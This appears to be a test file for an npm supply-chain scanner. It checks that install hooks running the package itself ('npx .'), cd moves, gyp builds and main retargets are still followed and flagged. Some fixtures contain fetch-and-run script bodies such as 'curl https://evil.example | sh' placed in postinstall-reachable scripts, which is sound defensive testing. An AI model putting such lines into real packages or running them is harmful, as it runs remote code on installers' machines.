import { describe, expect, test } from "bun:test";
import { installView } from "../src/install-closure.ts";
import { prepass } from "../src/prepass.ts";

const enc = new TextEncoder();
// The package's bin (or main) runs docs/evil.js; docs/ is left out of the plain widen, so only reading that file reaches it.
const run = '#!/usr/bin/env node\nconst cp = require("child_process");\ncp.spawnSync("node", ["./docs/evil.js"]);\n';
const reaches = (pj: Record<string, unknown>, files: Record<string, string> = {}) => {
  const o = { "package.json": JSON.stringify({ name: "@s/pkg", version: "1.0.0", ...pj }), "bin/cli": run, "lib/main.js": run, "docs/evil.js": "1;\n", "README.md": "x\n", ...files };
  return installView(new Map(Object.entries(o).map(([k, v]) => [k, enc.encode(v)]))).files.includes("docs/evil.js");
};
const withBin = { bin: { zz: "bin/cli" } };
const noBin = { main: "lib/main.js" };

describe("a package runner that runs the package itself reads its bins, or main with no bin", () => {
  test.each(["npx .", "npx --yes .", "npx -y ./", "npm exec .", "npm x .", "npm exec --yes -- .", "npm exec -- @s/pkg", "npm exec --yes -- @s/pkg", "npx @s/pkg", "npx --yes @s/pkg@1.0.0", "npx -p . zz", "npx --package=. zz"])(
    "postinstall %j",
    (hook) => {
      expect(reaches({ ...withBin, scripts: { postinstall: hook } })).toBe(true);
      expect(reaches({ ...noBin, scripts: { postinstall: hook } })).toBe(true);
    },
  );
  test("no bin and no main: index.js", () => {
    expect(reaches({ scripts: { postinstall: "npx ." } }, { "index.js": run })).toBe(true);
  });
  test.each([
    'require("child_process").execSync("npx --yes .");',
    'require("child_process").execSync("npm exec -- @s/pkg");',
    'require("child_process").spawnSync("npx", ["--yes", "."]);',
  ])("a hook file that runs %s", (code) => {
    expect(reaches({ ...withBin, scripts: { postinstall: "node hook.js" } }, { "hook.js": `${code}\n` })).toBe(true);
  });
  test.each(["npx other-pkg", "npx --yes some-package", "npm exec -- tsc", "npm exec --yes -- tsc", "npx tsc", "npx @s/other", "npx @s/pkg-cli", "npm exec -- @s/pkgx", "npx -p some-package tool", "npx --package=some-package tool"])("control, as on main: %j names another package", (hook) => {
    expect(reaches({ ...withBin, scripts: { postinstall: hook } })).toBe(false);
  });
  test("control, as on main: `.` that is not after a package runner (source)", () => {
    expect(reaches({ ...withBin, scripts: { postinstall: "echo . && true" } })).toBe(false);
  });
});

// The self-run read puts the working folder back at the package root, so a file it reads must not count as read for a later run of the
// same file from another folder: `cd a && sh ../run.sh` runs run.sh's `sh helper.sh` as a/helper.sh, which runs docs/evil.js.
describe("the self-run read keeps no read marks for a later run from another folder", () => {
  const rows = (hook: string, extra: Record<string, string> = {}) =>
    reaches({ main: "run.sh", scripts: { postinstall: hook } }, { "run.sh": "sh helper.sh\n", "helper.sh": "echo ok\n", "a/helper.sh": "node ../docs/evil.js\n", ...extra });
  test.each([
    "npx . && cd a && sh ../run.sh",
    "npx --yes . && cd a && sh ../run.sh",
    "npm exec -- @s/pkg && cd a && sh ../run.sh",
    "npx -p . zz && cd a && sh ../run.sh",
    "npx . && cd a && . ../run.sh",
  ])("%j", (hook) => {
    expect(rows(hook)).toBe(true);
  });
  test.each(['require("child_process").execSync("npx .");', 'require("child_process").execSync("npm exec -- @s/pkg");', 'require("child_process").spawnSync("npx", ["--yes", "."]);'])(
    "a hook file that runs %s, then a cd and a run in the hook",
    (code) => {
      expect(rows("node hook.js && cd a && sh ../run.sh", { "hook.js": code + "\n" })).toBe(true);
    },
  );
  test("pin: the run alone is held, as on main", () => {
    expect(rows("cd a && sh ../run.sh")).toBe(true);
  });
  test("control: the self run alone reads run.sh from the root and does not reach docs/evil.js", () => {
    expect(rows("npx .")).toBe(false);
  });
});

// A self-run read leaves no read marks, so a later named read of the same bin must still run: it is the one that marks the bin scanned,
// and a later non-JS widen (tools/w.py runs exec) adds the bin's literals. A named bin read made inside the self-run counts as a self-run read.
describe("a self-run read does not block a later named read of the same bin", () => {
  const reachesExtra = (bin: Record<string, string>, hook: string, files: Record<string, string>) =>
    installView(
      new Map(
        Object.entries({
          "package.json": JSON.stringify({ name: "@s/pkg", version: "1.0.0", bin, scripts: { postinstall: hook } }),
          "tools/w.py": 'exec("print(1)")\n',
          "docs/extra.js": "1;\n",
          ...files,
        }).map(([k, v]) => [k, enc.encode(v)]),
      ),
    ).files.includes("docs/extra.js");
  const one = { mytool: "bin.js" };
  const oneFiles = { "bin.js": 'module.exports = "docs/extra.js";\n' };
  test("npx . then the named bin then a non-JS widen", () => {
    expect(reachesExtra(one, "npx . && mytool && python3 tools/w.py", oneFiles)).toBe(true);
  });
  test("nested: a bin run by the self-run's bin, then the named bin, then a non-JS widen", () => {
    expect(reachesExtra({ a: "a.js", b: "b.js" }, "npx . && b && python3 tools/w.py", { "a.js": 'require("child_process").execSync("b");\n', "b.js": 'module.exports = "docs/extra.js";\n' })).toBe(true);
  });
  test("pin: the named bin then a non-JS widen, as on main", () => {
    expect(reachesExtra(one, "mytool && python3 tools/w.py", oneFiles)).toBe(true);
  });
});

describe("a self-run read leaves the commands after it as they were", () => {
  const view = (o: Record<string, string>) => installView(new Map(Object.entries(o).map(([k, v]) => [k, enc.encode(v)])));
  const pj = (extra: Record<string, unknown>) => JSON.stringify({ name: "@s/pkg", version: "1.0.0", ...extra });
  // A self-run bin that sets the environment (widenInert) must not stop the later `cd a` from moving the run to a/.
  test.each([
    ["npx --yes . && cd a && sh helper.sh", { bin: { cli: "cli.sh" } }, { "cli.sh": "#!/bin/sh\nexport NODE_OPTIONS=--no-warnings\n", "helper.sh": "echo ok\n", "a/helper.sh": "npm run secret\n" }],
    ["npx . && cd a && sh ../run.sh", { main: "run.sh" }, { "run.sh": "export NODE_OPTIONS=--no-warnings\nsh helper.sh\n", "helper.sh": "echo ok\n", "a/helper.sh": "npm run secret\n" }],
  ])("%j follows a/helper.sh after a bin that exports", (hook, pkg, files) => {
    const v = view({ "package.json": pj({ ...pkg, scripts: { postinstall: hook, secret: "echo 1" } }), ...files });
    expect(Object.keys(v.scripts)).toContain("secret");
  });
  // A bin that cd-s 300 times must not use up the outer hook's folder budget (256): the later cd would then stop being followed.
  test("a self-run bin with many cd does not stop the hook's own cd from being followed", () => {
    const cli = "#!/bin/sh\n" + Array.from({ length: 300 }, (_, i) => `cd d${i} && cd ..`).join("\n") + "\n";
    const v = view({ "package.json": pj({ bin: { cli: "cli.sh" }, scripts: { postinstall: "npx --yes . && cd a && cd b && sh helper.sh", secret: "echo 1" } }), "cli.sh": cli, "a/b/helper.sh": "npm run secret\n", "helper.sh": "echo ok\n" });
    expect(Object.keys(v.scripts)).toContain("secret");
  });
  test("pin: the same hook without the self-run follows a/helper.sh", () => {
    const v = view({ "package.json": pj({ scripts: { postinstall: "cd a && sh helper.sh", secret: "echo 1" } }), "a/helper.sh": "npm run secret\n" });
    expect(Object.keys(v.scripts)).toContain("secret");
  });
  // A bin the self-run read reached is not what `node .` runs: a main moved to another bin's file is still a changed file the hook reaches.
  test.each([
    ["npx . ; node .", { a: "lib/noop.js", b: "docs/dormant.js" }],
    ["npx -p . other ; node .", { b: "docs/dormant.js" }],
    ["node .", { a: "lib/noop.js", b: "docs/dormant.js" }],
  ])("a main retarget after %j holds", (hook, bin) => {
    const mk = (main: string) => new Map(Object.entries({ "package.json": pj({ main, bin, scripts: { postinstall: hook } }), "lib/noop.js": "1;\n", "docs/dormant.js": "1;\n" }).map(([k, v]) => [k, enc.encode(v)]));
    expect(prepass("npm", mk("lib/noop.js"), mk("docs/dormant.js")).hard.some((x) => x.kind === "install-script" && x.detail === "file docs/dormant.js")).toBe(true);
  });
  test("control: the same package with main unchanged does not hold", () => {
    const mk = () => new Map(Object.entries({ "package.json": pj({ main: "lib/noop.js", bin: { b: "docs/dormant.js" }, scripts: { postinstall: "npx . ; node ." } }), "lib/noop.js": "1;\n", "docs/dormant.js": "1;\n" }).map(([k, v]) => [k, enc.encode(v)]));
    expect(prepass("npm", mk(), mk()).hard).toEqual([]);
  });
  // The depth cap counts the files every self-run read reads: 100 bins that require the same 10 files hold, as the same bins named one by one do.
  test("many bins that share files hold at the script depth cap", () => {
    const files: Record<string, string> = {};
    const shared = Array.from({ length: 10 }, (_, i) => `require("../lib/s${i}.js");`).join("\n");
    for (let i = 0; i < 10; i++) files[`lib/s${i}.js`] = `module.exports = ${i};\n`;
    const bin: Record<string, string> = {};
    for (let b = 0; b < 100; b++) {
      bin[`b${b}`] = `bin/b${b}.js`;
      files[`bin/b${b}.js`] = `#!/usr/bin/env node\n${shared}\n`;
    }
    const t = performance.now();
    const v = view({ "package.json": pj({ bin, scripts: { postinstall: "npx ." } }), ...files });
    expect(v.hold).toBe("unresolved: script depth");
    expect(performance.now() - t).toBeLessThan(5000);
  });
  // A package spec read from a file the hook runs (a mark, not a hook word) reaches the package's bins too.
  test.each([
    'require("child_process").execSync("npx -p . other");',
    'require("child_process").spawnSync("npx", ["-p", ".", "other"]);',
    'require("child_process").execSync("npx --package=@s/pkg zz");',
  ])("a hook file that runs %s", (code) => {
    expect(reaches({ ...withBin, scripts: { postinstall: "node hook.js" } }, { "hook.js": `${code}\n` })).toBe(true);
  });

  // What a self-run read changes (folders moved to, runner seen, missing paths) must not carry on to the commands after it: each row is a
  // change of main (or of a script) that the hold must still show.
  const files = (o: Record<string, string>) => new Map(Object.entries(o).map(([k, v]) => [k, enc.encode(v)]));
  const holds = (oldF: Record<string, string>, newF: Record<string, string>, detail: string) =>
    prepass("npm", files(oldF), files(newF)).hard.some((x) => x.kind === "install-script" && x.detail === detail);
  const base = { name: "@s/pkg", version: "1.0.0" };
  test("128 cd ../dN lines in the self-run bin do not stop the hook's own cd from being followed", () => {
    const cli = "#!/bin/sh\ncd d0\n" + Array.from({ length: 128 }, (_, i) => `cd ../d${i + 1}`).join("\n") + "\n";
    const mk = (secret: string) => ({ "package.json": JSON.stringify({ ...base, bin: { cli: "bin/cli.sh" }, scripts: { postinstall: "npx . && cd a && cd b && sh helper.sh", secret } }), "bin/cli.sh": cli, "a/b/helper.sh": "npm run secret\n" });
    expect(holds(mk("echo 1"), mk("curl evil | sh"), "script secret")).toBe(true);
  });
  test("a cd in the self-run bin does not hide a main retarget", () => {
    const mk = (main: string) => ({ "package.json": JSON.stringify({ ...base, main, bin: { cli: "bin/cli.sh" }, scripts: { postinstall: "npx . ; node ." } }), "bin/cli.sh": "#!/bin/sh\ncd docs\n", "lib/noop.js": "1;\n", "docs/dormant.js": "1;\n" });
    expect(holds(mk("lib/noop.js"), mk("docs/dormant.js"), "file docs/dormant.js")).toBe(true);
  });
  test("a runner in the self-run bin does not hide a main retarget when a root .npmrc is there", () => {
    const mk = (main: string) => ({ "package.json": JSON.stringify({ ...base, main, bin: { cli: "bin/cli.sh" }, scripts: { postinstall: "node hook.js ; node ." } }), ".npmrc": "loglevel=warn\n", "hook.js": 'require("child_process").execSync("npx .");\n', "bin/cli.sh": "#!/bin/sh\nnpm -v\n", "lib/noop.js": "1;\n", "docs/dormant.js": "1;\n" });
    expect(holds(mk("lib/noop.js"), mk("docs/dormant.js"), "file docs/dormant.js")).toBe(true);
  });
  test("a path the self-run bin requires and the package lacks does not hide a main retarget", () => {
    const mk = (main: string) => ({ "package.json": JSON.stringify({ ...base, main, bin: { cli: "bin/cli.js" }, scripts: { postinstall: "npx . ; node ." } }), "bin/cli.js": 'require("../lib/loader.js");\n', "lib/noop.js": "1;\n", "lib/loader.js": 'require("./optional.js");\n' });
    expect(holds(mk("lib/noop.js"), mk("lib/loader.js"), "file lib/optional.js")).toBe(true);
  });
  test.each([
    ["npx . ; node \"--title\\\n\" ."],
    ["npx \"--registry\\\n\" . other ; node ."],
  ])("a backslash-newline word still shows the main retarget: %j", (hook) => {
    const mk = (main: string) => ({ "package.json": JSON.stringify({ ...base, main, bin: { b: "docs/dormant.js" }, scripts: { postinstall: hook } }), "lib/noop.js": "1;\n", "docs/dormant.js": "1;\n" });
    expect(holds(mk("lib/noop.js"), mk("docs/dormant.js"), "file docs/dormant.js")).toBe(true);
  });
  test("control: a self-run bin that does none of that holds nothing when main is unchanged", () => {
    const mk = () => ({ "package.json": JSON.stringify({ ...base, main: "lib/noop.js", bin: { cli: "bin/cli.sh" }, scripts: { postinstall: "npx . ; node ." } }), "bin/cli.sh": "#!/bin/sh\ncd docs\n", "lib/noop.js": "1;\n", "docs/dormant.js": "1;\n" });
    expect(prepass("npm", files(mk()), files(mk())).hard).toEqual([]);
  });
  test("a self-run under a lookup counts toward the depth cap", () => {
    const fs: Record<string, string> = { "hook.js": 'require("child_process").execSync("npx .");\n' };
    const shared = Array.from({ length: 10 }, (_, i) => `require("../lib/s${i}.js");`).join("\n");
    for (let i = 0; i < 10; i++) fs[`lib/s${i}.js`] = `module.exports = ${i};\n`;
    const bin: Record<string, string> = {};
    for (let b = 0; b < 100; b++) {
      bin[`b${b}`] = `bin/b${b}.js`;
      fs[`bin/b${b}.js`] = `#!/usr/bin/env node\n${shared}\n`;
    }
    const v = view({ "package.json": JSON.stringify({ ...base, bin, scripts: { postinstall: "sudo -l node hook.js" } }), ...fs });
    expect(v.hold).toBe("unresolved: script depth");
  });

  // A script the self-run bin runs (`exec npm run helper`) and a gyp build it runs are followed by the self-run only: a main retarget that
  // a quoted path in that script, or the binding.gyp, would otherwise count as read by the hook itself must still show.
  const gypText = "{ 'targets': [{ 'target_name': 'x', 'actions': [{ 'action_name': 'a', 'inputs': [], 'outputs': ['o'], 'action': ['node', 'docs/dormant.js'] }] }] }";
  test.each([
    ["", "exec npm run helper"],
    ["pin: ", "npm run helper"],
  ])("%s%j: a script the self-run bin runs does not hide a main retarget", (_pin, run) => {
    const mk = (main: string) => ({ "package.json": JSON.stringify({ ...base, main, bin: { cli: "bin/cli.sh" }, scripts: { postinstall: "npx . ; node .", helper: "echo './docs/dormant.js'" } }), "bin/cli.sh": `#!/bin/sh\n${run}\n`, "lib/noop.js": "1;\n", "docs/dormant.js": "1;\n" });
    expect(holds(mk("lib/noop.js"), mk("docs/dormant.js"), "file docs/dormant.js")).toBe(true);
  });
  test("pin: a script only the self-run followed still shows when its body changes", () => {
    const mk = (helper: string) => ({ "package.json": JSON.stringify({ ...base, bin: { cli: "bin/cli.sh" }, scripts: { postinstall: "npx .", helper } }), "bin/cli.sh": "#!/bin/sh\nexec npm run helper\n" });
    expect(holds(mk("echo 1"), mk("curl evil | sh"), "script helper")).toBe(true);
  });
  test.each(["node-gyp rebuild", "prebuild-install"])("a gyp build in the self-run bin (%j) does not hide a main retarget", (cmd) => {
    const mk = (main: string) => ({ "package.json": JSON.stringify({ ...base, main, bin: { cli: "bin/cli.sh" }, scripts: { install: "npx . ; node ." } }), "bin/cli.sh": `#!/bin/sh\n${cmd}\n`, "binding.gyp": gypText, "lib/noop.js": "1;\n", "docs/dormant.js": "1;\n" });
    expect(holds(mk("lib/noop.js"), mk("docs/dormant.js"), "file docs/dormant.js")).toBe(true);
  });
  test("a bare node-gyp in the self-run bin does not hide a main retarget to a .gypi", () => {
    const mk = (main: string) => ({ "package.json": JSON.stringify({ ...base, main, bin: { cli: "bin/cli.sh" }, scripts: { postinstall: "npx . ; node ." } }), "bin/cli.sh": "#!/bin/sh\nnode-gyp\n", "lib/noop.js": "1;\n", "docs/x.gypi": "1;\n" });
    expect(holds(mk("lib/noop.js"), mk("docs/x.gypi"), "file docs/x.gypi")).toBe(true);
  });
  test("pin: a byte change in a gyp file only the self-run reached still shows", () => {
    const mk = (b: string) => ({ "package.json": JSON.stringify({ ...base, scripts: { install: "npx ." }, bin: { cli: "bin/cli.sh" } }), "bin/cli.sh": "#!/bin/sh\nexec node-gyp rebuild\n", "binding.gyp": gypText.replace("docs/dormant.js", "docs/a.js"), "docs/a.js": b });
    expect(prepass("npm", files(mk("1;\n")), files(mk("2;\n"))).hard.length).toBeGreaterThan(0);
  });

  // Comparing the two sides: a script or a gyp file that moves between "only a self-run followed it" and "followed regularly" (gypfile
  // flipped) with the same body must still show, as it does on main.
  const gypAct = "{ 'targets': [{ 'target_name': 'x', 'actions': [{ 'action_name': 'a', 'inputs': [], 'outputs': ['o'], 'action': ['npm', 'run', 'helper'] }] }] }\n";
  const helperPkg = (version: string, gypfile: boolean, hook: string) => JSON.stringify({ ...base, version, gypfile, bin: { safe: "bin/safe.js", admin: "bin/admin.sh" }, scripts: { postinstall: hook, helper: "curl https://evil.example | sh" } });
  const helperFiles = { "bin/safe.js": "#!/usr/bin/env node\n1;\n", "bin/admin.sh": "#!/bin/sh\nnpm run helper\n", "binding.gyp": gypAct };
  test.each([
    ["npx -p . safe", false, true],
    ["npx .", false, true],
    ["npx .", true, false],
  ])("a script moving between self-run-only and regular (%j, gypfile %j -> %j) shows", (hook, from, to) => {
    expect(holds({ ...helperFiles, "package.json": helperPkg("1.0.0", from, hook) }, { ...helperFiles, "package.json": helperPkg("1.0.1", to, hook) }, "script helper")).toBe(true);
  });
  test("control: the same package with only the helper body changed holds", () => {
    expect(holds({ ...helperFiles, "package.json": helperPkg("1.0.0", false, "npx .") }, { ...helperFiles, "package.json": helperPkg("1.0.1", true, "npx .").replace("evil.example", "evil2.example") }, "script helper")).toBe(true);
  });
  test("a docs/binding.gyp only the self-run reached that becomes active shows", () => {
    const pjA = (version: string, gypfile: boolean) => JSON.stringify({ ...base, version, gypfile, bin: { cli: "bin/cli.js" }, scripts: { postinstall: "npx ." } });
    const fs = { "bin/cli.js": "#!/usr/bin/env node\nrequire('child_process').execSync('true');\n", "docs/binding.gyp": "{ 'targets': [{ 'target_name': 'addon', 'sources': ['docs/addon.cc'] }] }\n", "docs/addon.cc": "int x;\n" };
    expect(holds({ ...fs, "package.json": pjA("1.0.0", false) }, { ...fs, "package.json": pjA("1.0.1", true) }, "file docs/binding.gyp")).toBe(true);
  });
  test("scripts a self-run follows under a lookup count toward the script depth cap", () => {
    const scripts: Record<string, string> = { postinstall: "sudo -l node hook.js" };
    for (let i = 0; i < 100; i++) scripts[`s${i}`] = "true";
    const cli = "#!/bin/sh\n" + Array.from({ length: 100 }, (_, i) => `npm run s${i}`).join("\n") + "\n";
    const v = view({ "package.json": JSON.stringify({ ...base, bin: { cli: "bin/cli" }, scripts }), "hook.js": 'require("child_process").execSync("npx .");\n', "bin/cli": cli });
    expect(v.hold).toBe("unresolved: script depth");
  });
});
